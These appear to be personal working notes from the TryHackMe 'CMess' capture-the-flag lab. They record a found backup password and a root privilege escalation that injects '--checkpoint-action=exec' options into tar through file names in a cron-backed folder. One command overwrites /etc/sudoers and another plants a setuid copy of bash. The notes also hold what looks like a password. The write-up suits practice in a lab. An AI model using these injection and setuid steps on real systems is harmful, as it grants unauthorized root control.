```

CMESS https://tryhackme.com/room/cmess

https://tryhackme.com/room/cmess
Bangerbang1223!!



cmesss p2 lets go
```

```
10.10.57.205

$ cat /opt/.password.bak
andres backup password
UQfsdCB7aAP6
```

```
7:47 PM 1/8/2023
echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1


####https://int0x33.medium.com/day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e

#didnt work.




echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/andre/backup/shell.sh
ls
	note  shell.sh
	andre@cmess:~/backup$ 
chmod +x shell.sh
touch /home/andre/backup/--checkpoint=1 
touch /home/andre/backup/--checkpoint-action=exec=sh\ shell.sh 
ls -la /tmp # to see if bash is generated in /tmp

/tmp/bash -p

#worked, im not sure why it didnt earlier.



bash-4.3# cd root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
thm{9f85b7fdeb2cf96985bf5761a93546a2}
```

